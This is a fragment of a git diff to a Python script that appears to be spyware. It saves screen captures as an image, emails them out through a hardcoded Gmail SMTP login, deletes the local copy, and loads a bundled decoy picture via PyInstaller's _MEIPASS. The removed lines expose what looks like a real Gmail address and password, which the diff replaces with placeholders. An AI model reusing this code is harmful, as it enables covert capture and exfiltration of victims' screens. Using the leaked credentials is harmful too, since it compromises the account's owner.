@@ -12,8 +12,8 @@ from email import encoders
 
 
 def send_mail(message):
-    email = "rocketvk.18@gmail.com"
-    password = "$aint_101"
+    email = "email@email.com"
+    password = "password"
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
     server.login(email, password)
@@ -45,8 +45,6 @@ def recapture():
     image.save("scary.png")
     attach(temp_directory)
     os.remove("scary.png")
-
-
 
 namas_bekin = sys._MEIPASS + "\sester.png"
 try:
